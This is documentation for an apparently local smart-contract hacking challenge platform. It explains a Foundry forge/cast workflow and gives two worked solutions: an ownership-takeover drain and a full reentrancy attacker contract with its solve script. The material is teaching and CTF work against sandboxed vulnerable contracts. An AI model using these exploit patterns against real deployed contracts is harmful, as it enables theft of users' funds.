# Foundry Workflow

The JavaScript sandbox (described in [script-sdk.md](script-sdk.md)) is the primary interface for trading-style challenges. For smart-contract hacking challenges you often need to deploy attacker contracts or execute multi-step Solidity scripts — this guide covers that workflow using Foundry's `forge` and `cast` tools.

> **In-browser IDE:** The frontend includes a Solidity IDE tab that exposes the `solve/` workspace directly in the browser. The **Run Script** button triggers `forge_script_run` over WebSocket; the **Deploy** button triggers `forge_deploy`. Output streams in real time via `forge_log` messages and completes with `forge_done`. See [websocket-api.md](websocket-api.md) for the message protocol.

---

## Quick reference

| Tool | Use case |
|---|---|
| `cast call` | Read a view/pure function (no gas, no key) |
| `cast send` | Send a transaction (requires `--private-key`) |
| `forge create` | Deploy a single contract |
| `forge script` | Run a Solidity script (deploy + interact in one broadcast) |

All commands take `--rpc-url $RPC_URL`. Signature-changing calls also need `--private-key $PRIVATE_KEY`.

---

## Setup

### 1. Get connection info

Start a challenge in the UI, then call the engine's connection info endpoint:

```bash
curl http://localhost:3000/api/connection_info | jq .
```

Response:

```json
{
  "rpcUrl": "http://127.0.0.1:8545",
  "chainId": 31337,
  "player": {
    "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "privateKey": "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
  },
  "contracts": {
    "vault": "0x5FbDB2315678afecb367f032d93F642f64180aa3"
  },
  "tokens": {
    "WETH": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
    "USDC": "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0"
  },
  "pools": {
    "weth-usdc-uniswap": {
      "address":     "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9",
      "exchange":    "uniswap",
      "displayName": "Uniswap",
      "tokenA":      "WETH",
      "tokenB":      "USDC"
    }
  }
}
```

### 2. Write a .env file

The `solve/` directory at the repo root contains a pre-configured Foundry project. Use the included helper to write a `.env` file:

```bash
cd solve/
./env.sh           # writes .env with RPC_URL, PRIVATE_KEY, ADDR_*, TOKEN_*, POOL_*
source .env        # export vars for cast commands in this shell
```

The `.env` file is gitignored (it contains your private key).

For each pool, `env.sh` exports five variables:

```bash
POOL_WETH_USDC_UNISWAP=0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9   # pool address
POOL_WETH_USDC_UNISWAP_EXCHANGE=uniswap                              # exchange slug
POOL_WETH_USDC_UNISWAP_DISPLAY=Uniswap                               # display name
POOL_WETH_USDC_UNISWAP_TOKEN_A=WETH                                  # token A symbol
POOL_WETH_USDC_UNISWAP_TOKEN_B=USDC                                  # token B symbol
```

Hyphens in pool IDs are replaced with underscores and the name is uppercased, so `weth-usdc-uniswap` becomes `POOL_WETH_USDC_UNISWAP`.

### 3. The solve workspace

```
solve/
├── foundry.toml          # Foundry config — libs points to contracts/lib (forge-std included)
├── env.sh                # writes .env from /api/connection_info
├── lib/ -> ../contracts/lib   # forge-std symlink — no extra install needed
├── script/
│   └── Solve.s.sol       # shared template solve script (fallback for CLI)
├── src/
│   └── Attacker.sol      # shared template attacker contract
└── challenges/
    └── <challenge-id>/   # per-challenge workspace (seeded on first IDE access)
        ├── Script.s.sol
        └── lib/          # read-only copies of relevant challenge contract sources
```

All Solidity files in `solve/` can import `forge-std`:

```solidity
import "forge-std/Script.sol";
import "forge-std/Test.sol";
```

---

## cast — quick interactions

`cast` is ideal for one-off reads and simple sends without writing a full script.

### Read a view function

```bash
# Check the vault's ETH balance
cast call $ADDR_VAULT "vaultBalance()" --rpc-url $RPC_URL

# Check who owns the vault
cast call $ADDR_VAULT "owner()" --rpc-url $RPC_URL

# Read your token balance
cast call $TOKEN_USDC "balanceOf(address)(uint256)" $PLAYER_ADDRESS --rpc-url $RPC_URL
```

### Send a transaction

```bash
# Call a no-arg function
cast send $ADDR_VAULT "drain()" \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Call a function with arguments
cast send $ADDR_VAULT "transferOwnership(address)" $PLAYER_ADDRESS \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Send ETH with the call (payable function)
cast send $ADDR_VAULT "deposit()" \
  --value 1ether \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### Useful cast utilities

```bash
# Convert hex → decimal
cast to-dec 0x3e8

# Convert decimal → hex
cast to-hex 1000

# Convert wei → ether
cast from-wei 1000000000000000000

# ABI-encode calldata
cast calldata "attack(address,uint256)" $ADDR_VAULT 1000000000000000000
```

---

## forge script — Solidity solve scripts

A forge script is a Solidity contract that runs on-chain in a single broadcast. It can deploy contracts, call functions, and chain multiple transactions — all in the correct order.

### Run the template

```bash
cd solve/
source .env

forge script script/Solve.s.sol \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY \
  --broadcast
```

Add `--slow` if you need to submit transactions one at a time (useful for debugging).  
Add `-vvvv` for verbose trace output showing every call.

### Script anatomy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        // Read env vars written by env.sh
        uint256 playerKey  = vm.envUint("PRIVATE_KEY");
        address vault      = vm.envAddress("ADDR_VAULT");

        // All transactions between start/stopBroadcast are sent on-chain
        vm.startBroadcast(playerKey);

        // ... your exploit ...

        vm.stopBroadcast();
    }
}
```

### Deploy a contract from a script

```solidity
vm.startBroadcast(playerKey);

MyAttacker atk = new MyAttacker(vault);
atk.attack{value: 1 ether}();

vm.stopBroadcast();
```

### Cheatcodes available in scripts

| Cheatcode | Description |
|---|---|
| `vm.envUint("KEY")` | Read uint256 from env |
| `vm.envAddress("KEY")` | Read address from env |
| `vm.envBytes32("KEY")` | Read bytes32 from env |
| `vm.startBroadcast(key)` | Begin recording txs to broadcast |
| `vm.stopBroadcast()` | End broadcast |
| `vm.label(addr, "name")` | Attach a human label (shows in traces) |
| `console.log(...)` | Print during script execution |

---

## forge create — deploy a single contract

When you want to deploy one contract without a script:

```bash
# Simple deploy
forge create src/Attacker.sol:Attacker \
  --constructor-args $ADDR_VAULT \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY

# Payable constructor
forge create src/Attacker.sol:Attacker \
  --constructor-args $ADDR_VAULT \
  --value 1ether \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY
```

The output includes `Deployed to: 0x...` — copy that address and export it:

```bash
export ATTACKER=0x<deployed-address>
cast send $ATTACKER "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

---

## Worked example: Admin Who?

**Challenge:** The `UnprotectedOwnership` vault has `onlyOwner` on `drain()` but not on `transferOwnership()`. Anyone can steal ownership and drain.

**No attacker contract needed** — two `cast send` calls are enough.

```bash
cd solve/
./env.sh && source .env

# 1. Verify the bug: current owner should be the deployer, not us
cast call $ADDR_VAULT "owner()" --rpc-url $RPC_URL

# 2. Steal ownership
cast send $ADDR_VAULT "transferOwnership(address)" $PLAYER_ADDRESS \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# 3. Confirm ownership transferred
cast call $ADDR_VAULT "owner()" --rpc-url $RPC_URL

# 4. Drain the vault
cast send $ADDR_VAULT "drain()" \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

Or as a single forge script (`script/SolveAdminWho.s.sol`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";

interface IUnprotectedOwnership {
    function transferOwnership(address newOwner) external;
    function drain() external;
}

contract SolveAdminWho is Script {
    function run() external {
        uint256 playerKey  = vm.envUint("PRIVATE_KEY");
        address playerAddr = vm.envAddress("PLAYER_ADDRESS");
        address vault      = vm.envAddress("ADDR_VAULT");

        vm.startBroadcast(playerKey);

        IUnprotectedOwnership(vault).transferOwnership(playerAddr);
        IUnprotectedOwnership(vault).drain();

        vm.stopBroadcast();
    }
}
```

```bash
forge script script/SolveAdminWho.s.sol \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
```

---

## Worked example: Leaky Vault

**Challenge:** `VulnerableVault.withdraw()` sends ETH before updating the balance — a classic reentrancy bug. You need an attacker contract whose `receive()` re-enters `withdraw()`.

**Step 1 — write the attacker contract** (`src/ReentrancyExploit.sol`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function totalBalance() external view returns (uint256);
}

contract ReentrancyExploit {
    IVulnerableVault public immutable vault;
    address public immutable owner;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        attackAmount = msg.value;
        // Deposit so we have a legitimate balance to withdraw
        vault.deposit{value: attackAmount}();
        // Trigger the reentrancy loop
        vault.withdraw(attackAmount);
    }

    // Called by the vault on every ETH transfer — re-enter while vault still has funds
    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
```

**Step 2 — write the solve script** (`script/SolveLeakyVault.s.sol`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/ReentrancyExploit.sol";

contract SolveLeakyVault is Script {
    function run() external {
        uint256 playerKey = vm.envUint("PRIVATE_KEY");
        address vault     = vm.envAddress("ADDR_VAULT");

        vm.startBroadcast(playerKey);

        ReentrancyExploit exploit = new ReentrancyExploit(vault);
        exploit.attack{value: 1 ether}();
        exploit.withdraw();

        vm.stopBroadcast();
    }
}
```

**Step 3 — run it:**

```bash
forge script script/SolveLeakyVault.s.sol \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast -vvvv
```

The `-vvvv` flag prints a full call trace — useful for confirming the reentrancy loop fired.

---

## Calling forge scripts from JS triggers

The JS Script Sandbox exposes a `runForgeScript` function that lets you invoke a `forge script` directly from within a trigger callback. This bridges the two workflows: JS handles the _when_, Solidity handles the _what_.

### When to use this

| Use this pattern when… | Instead of… |
|---|---|
| The exploit timing depends on price or block number | Polling manually and clicking "Run Script" |
| A multi-step exploit needs on-chain atomicity (forge handles sequencing) | Writing the whole thing in JS |
| You want one-shot execution on a market event | Running forge manually after watching the chart |

### Example

```js
// Fire a reentrancy exploit when price is artificially depressed
const triggerId = onPriceBelow("weth-usdc-uniswap", 2500, async (ctx) => {
  ctx.log(`Dip detected at $${ctx.price.toFixed(2)} — running exploit`);

  const result = await runForgeScript("script/Solve.s.sol");

  if (result.success) {
    ctx.log("Exploit succeeded:", result.output.slice(-200));
    removeTrigger(triggerId);  // remove trigger so it doesn't fire again
  } else {
    ctx.log(`Exploit failed (exit ${result.exitCode}):`, result.output.slice(-300));
  }
});
```

The script path is relative to `solve/` (e.g. `"script/Solve.s.sol"`). The same environment variables that `env.sh` writes are injected automatically — `RPC_URL`, `PRIVATE_KEY`, `ADDR_*`, `TOKEN_*`, `POOL_*`.

Output is streamed to the Script Log panel in real time (prefixed with `[forge]`) so you can watch progress live.

While a `forge script` / `forge create` runs (IDE **Run Script**, **Deploy**, or `runForgeScript` from JS), the engine **pauses the challenge’s interval-mined blocks** and turns on Anvil **automine** so broadcast transactions can confirm. The on-chain block height may still advance during that window, but the **simulated** block counter in the UI does not tick until the forge process finishes.

Full API reference: [`runForgeScript` in script-sdk.md](script-sdk.md#forge-integration).

---

## Tips

**Dry-run before broadcasting** — omit `--broadcast` to simulate without submitting:

```bash
forge script script/Solve.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

**Verbose traces** — add `-vvvv` to see every call, return value, and revert reason.

**Re-run env.sh after restarting a challenge** — contract addresses change on each start.

**The engine checks win conditions automatically** — after your script runs, the engine evaluates the win condition on the next mined block. No need to call any flag endpoint.

**Mining is paused between blocks** — on Anvil the engine mines blocks on a timer. Your `forge script` or `cast send` calls go into the mempool immediately; the engine mines them in the next block interval (typically 500 ms – 1 s). Fast-forward from the UI if you need to advance quickly.

**Getting contract ABIs** — compiled artifacts are at `contracts/out/<ContractName>.sol/<ContractName>.json`. The `abi` field is copy-pasteable into cast or ethers.js.

```bash
cat contracts/out/UnprotectedOwnership.sol/UnprotectedOwnership.json | jq '.abi'
```

**Finding initialization calldata (upgradeable proxy challenges)** — the proxy's `initialize()` call is made at challenge start in block 1. Use `cast` or the SDK's `getBlockTransactions` to read it:

```bash
# List all transactions in block 1
cast block 1 --rpc-url $RPC_URL --json | jq '.transactions[]'

# Decode the calldata of a transaction (strip the 4-byte selector first)
cast decode-calldata "initialize(string,string,uint8,uint256,address)" <calldata>
```

Or from a player script:

```js
const txs = await getBlockTransactions(1);
for (const tx of txs) {
  if (tx.to?.toLowerCase() === getContractAddress("vault").toLowerCase()) {
    // Strip the 4-byte selector and decode
    const data = "0x" + tx.data.slice(10);
    const decoded = decodeCalldata(["string", "string", "uint8"], data);
    log(`Init args: ${JSON.stringify(decoded)}`);
  }
}
```
